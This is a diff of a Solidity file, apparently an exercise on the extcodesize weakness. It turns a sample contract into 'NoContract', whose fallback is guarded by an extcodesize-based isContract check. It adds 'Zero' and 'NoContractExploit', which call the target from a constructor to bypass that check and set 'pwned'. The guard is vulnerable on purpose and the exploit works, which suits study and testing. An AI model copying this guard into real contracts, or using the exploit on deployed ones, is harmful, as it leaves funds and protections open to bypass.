@@ -1,45 +1,42 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-contract Target {
-    function isContract(address account) public view returns (bool) {
-        // This method relies on extcodesize, which returns 0 for contracts in
-        // construction, since the code is only stored at the end of the
-        // constructor execution.
+contract NoContract {
+    function isContract(address addr) public view returns (bool) {
         uint256 size;
         assembly {
-            size := extcodesize(account)
+            size := extcodesize(addr)
         }
         return size > 0;
     }
 
+    modifier noContract() {
+        require(!isContract(msg.sender), "no contract allowed");
+        _;
+    }
+
     bool public pwned = false;
 
-    function protected() external {
-        require(!isContract(msg.sender), "no contract allowed");
+    fallback() external noContract {
         pwned = true;
     }
 }
 
-contract FailedAttack {
-    // Attempting to call Target.protected will fail,
-    // Target block calls from contract
-    function pwn(address _target) external {
-        // This will fail
-        Target(_target).protected();
-    }
-}
-
-contract Hack {
-    bool public isContract;
-    address public addr;
-
-    // When contract is being created, code size (extcodesize) is 0.
-    // This will bypass the isContract() check
+contract Zero {
     constructor(address _target) {
-        isContract = Target(_target).isContract(address(this));
-        addr = address(this);
-        // This will work
-        Target(_target).protected();
+        _target.call("");
     }
 }
+
+contract NoContractExploit {
+    address public target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn() external {
+        new Zero(target);
+    }
+}
+
